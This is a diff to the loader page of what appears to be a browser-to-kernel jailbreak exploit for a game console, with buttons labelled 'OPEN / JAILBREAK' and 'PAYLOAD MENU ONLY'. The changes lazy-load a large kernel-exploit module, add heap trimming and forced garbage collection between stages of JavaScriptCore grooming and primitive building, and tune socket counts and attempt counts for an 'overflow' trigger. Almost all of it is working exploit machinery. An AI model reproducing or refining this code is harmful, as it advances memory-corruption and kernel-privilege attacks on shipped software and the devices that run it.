@@ -231,10 +231,10 @@
 </div>
 <div id="homeActions">
   <a class="primary" id="homeOpen"
-     href="?v=4&amp;go=1&amp;auto=1&amp;trigger=overflow&amp;burn=full&amp;payload=1"
+     href="?v=5&amp;go=1&amp;auto=1&amp;trigger=overflow&amp;burn=full&amp;payload=1"
      tabindex="0">OPEN / JAILBREAK</a>
   <a class="secondary" id="homeMenu"
-     href="?v=4&amp;go=1&amp;menu=1"
+     href="?v=5&amp;go=1&amp;menu=1"
      tabindex="0">PAYLOAD MENU ONLY</a>
 </div>
 <div id="nav"></div>
@@ -251,7 +251,7 @@
 <div id="console" hidden></div>
 
 <script src="rop.js"></script>
-<script src="main.js?v=2"></script>
+<script src="main.js?v=3"></script>
 <script>window.offsetsReady = new Promise(function (res, rej) {
     var s = document.querySelector('script[src^="../offsets/"]');
     if (!s) return rej(new Error("offsets script was never injected by main.js"));
@@ -264,23 +264,58 @@
 </script>
 <script src="syscalls.js"></script>
 
-<script type="module">import { establishPrimitive, fakeCellReleased } from "./core.js?v=10";
-import { installWindowP, pairStatus } from "./mem.js?v=10";
+<script type="module">import { establishPrimitive, fakeCellReleased } from "./core.js?v=11";
+import { installWindowP, pairStatus } from "./mem.js?v=11";
 import { int64 } from "./int64.js";
-import { BANNED, ERRNO, K, r32, r16, w32, hexBytes, coreList }
-    from "./p2jb-kernel.js?v=1";
 
+// p2jb-kernel.js is ~10k lines — defer until the full kernel chain is required.
+let BANNED = {};
+let ERRNO = {};
+let K = null;
+let r32, r16, w32, hexBytes, coreList;
 let PK = null, makePoopsEngine = null, buildLadder = null;
+let kernelModulePromise = null;
 
-async function loadPoopsModules() {
-    const lib = await import("./p2jb-kernel.js?v=1");
+function loadKernelModule() {
+    if (!kernelModulePromise) {
+        kernelModulePromise = import("./p2jb-kernel.js?v=2").then(lib => {
+            BANNED = lib.BANNED;
+            ERRNO = lib.ERRNO;
+            K = lib.K;
+            r32 = lib.r32;
+            r16 = lib.r16;
+            w32 = lib.w32;
+            hexBytes = lib.hexBytes;
+            coreList = lib.coreList;
+            PK = lib.PK;
+            makePoopsEngine = lib.makePoopsEngine;
+            buildLadder = lib.buildLadder;
+            flushMark("P2JB-MODULES-LOADED", "lazy");
+            return lib;
+        });
+    }
+    return kernelModulePromise;
+}
 
-    await import("./p2jb-kernel.js?v=1");
-    const st = await import("./p2jb-kernel.js?v=1");
-    PK = lib.PK;
-    makePoopsEngine = lib.makePoopsEngine;
-    buildLadder = st.buildLadder;
-    flushMark("P2JB-MODULES-LOADED", "deferred-until-after-primitive");
+function trimExploitMemory() {
+    try {
+        for (const id of ["scr", "early", "cfg", "summary", "tally", "vitals"]) {
+            const el = document.getElementById(id);
+            if (!el) continue;
+            el.textContent = "";
+            if ("innerHTML" in el) el.innerHTML = "";
+        }
+        if (typeof globalThis.gc === "function") {
+            globalThis.gc();
+            globalThis.gc();
+        }
+    } catch (e) { }
+}
+
+async function settleMemory(ms) {
+    await new Promise(resolve => setTimeout(resolve, ms));
+    trimExploitMemory();
+    await new Promise(resolve => setTimeout(resolve, 250));
 }
 
 const Q = new URLSearchParams(location.search);
@@ -319,7 +354,9 @@ const BURN = (() => {
     const b = (Q.get("burn") || "full").toLowerCase();
     return (b === "none" || b === "full") ? b : "full";
 })();
-const DEFAULT_ATTEMPTS = TRIGGER === "overflow" ? 96 : 8;
+const DEFAULT_ATTEMPTS = TRIGGER === "overflow"
+    ? (Q.get("menu") === "1" ? 24 : 96)
+    : 8;
 
 const cfg = {
 
@@ -328,7 +365,8 @@ const cfg = {
     burn: BURN,
     netprobe: Q.get("netprobe") === "1",
     sockets: Math.max(4, Math.min(128,
-        parseInt(Q.get("sockets") || "", 10) || 80)),
+        parseInt(Q.get("sockets") || "", 10)
+        || (window.fw_float >= 12.0 ? 64 : 80))),
     attempts: Math.max(1, Math.min(512,
         parseInt(Q.get("attempts") || "", 10) || DEFAULT_ATTEMPTS)),
     kqBatch: Math.max(1, Math.min(32, parseInt(Q.get("kqbatch") || "", 10) || 8)),
@@ -565,6 +603,7 @@ async function enterSenderOnlyMode(reason) {
     senderOnly = true;
     elfldrSpawned = true;
     clearFailureBanners();
+    trimExploitMemory();
     setCatResult(true);
     stage("Already jailbroken — opening payload manager", "ok");
     flushMark("P2JB-SENDER-ONLY", clean(reason || "detected"));
@@ -1642,9 +1681,7 @@ async function bootPrimitiveAndChain() {
         if (typeof globalThis.gc === "function") {
             try { globalThis.gc(); } catch (e) { }
         }
-        // Give JSC an idle turn to reclaim the released carrier/groom before
-        // prepare() creates its worker ROP stack and the kernel-stage arenas.
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        await settleMemory(1500);
         flushMark("PRIMITIVE-MEMORY-RELIEF",
             "fake-carrier-dropped=1-history-state-null="
             + (history.state === null));
@@ -1663,9 +1700,6 @@ async function bootPrimitiveAndChain() {
         throw new Error("window.p was never published");
     nogcHard.p = p;
     assertInt64Identity();
-
-    stage("loading poops_lib / threads_lib / twin_lib / poops_stages");
-    await loadPoopsModules();
 
     const handoff = window.jbPrepared || null;
     let prepared;
@@ -1687,6 +1721,7 @@ async function bootPrimitiveAndChain() {
     flushMark("POST-PREP", "next=assertBases");
     assertBases();
     await probeErrnoConvention();
+    trimExploitMemory();
 }
 
 async function main() {
@@ -1714,6 +1749,9 @@ async function main() {
             return;
         }
 
+        stage("loading kernel module — this uses a lot of memory");
+        await loadKernelModule();
+        trimExploitMemory();
         await chooseCore();
 
         makeContext();
